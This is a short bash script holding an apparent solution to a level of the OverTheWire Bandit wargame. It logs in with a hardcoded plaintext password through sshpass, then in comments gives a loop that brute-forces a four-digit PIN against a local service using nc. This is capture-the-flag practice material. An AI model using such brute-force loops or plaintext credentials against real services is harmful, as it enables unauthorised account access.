#!/bin/bash

sshpass -f <(printf '%s\n' VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar) ssh bandit24@bandit.labs.overthewire.org -p 2220

# Solution: 	
#
#	mkdir /tmp/workspace
#	cd /tmp/workspace
#	vim brute.sh
#	-------------------------------------------
#	#!/bin/bash
#
#	password="VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar"
#	for i in {9999..0000}
#	do
#	        echo $password $i
#	done
#	-------------------------------------------
#	./brute.sh > attempts.txt
#	nc 127.0.0.1 30002 < attempts.txt
#
